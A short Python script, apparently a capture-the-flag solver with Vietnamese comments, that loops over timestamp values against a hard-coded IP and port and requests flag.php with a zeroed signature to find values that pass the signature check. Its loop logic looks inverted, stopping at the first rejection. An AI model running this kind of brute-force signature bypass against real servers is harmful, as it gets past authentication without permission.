import requests

i = 0
found = False  # Biến điều kiện

while not found:
    url = "http://47.128.66.76:30952/index.php?filename=flag.php&timestamp=*&sig=0"
    r = requests.get(url.replace('*', str(i)))
    
    if "Invalid Signature!" not in r.text:
        print("Tìm thấy giá trị", i)
        print(r.text)
    else:
        found = True  # Khi gặp "Invalid Signature," thiết lập found thành True để kết thúc vòng lặp
    
    print("Thử giá trị timestamp: ", i)
    i += 1
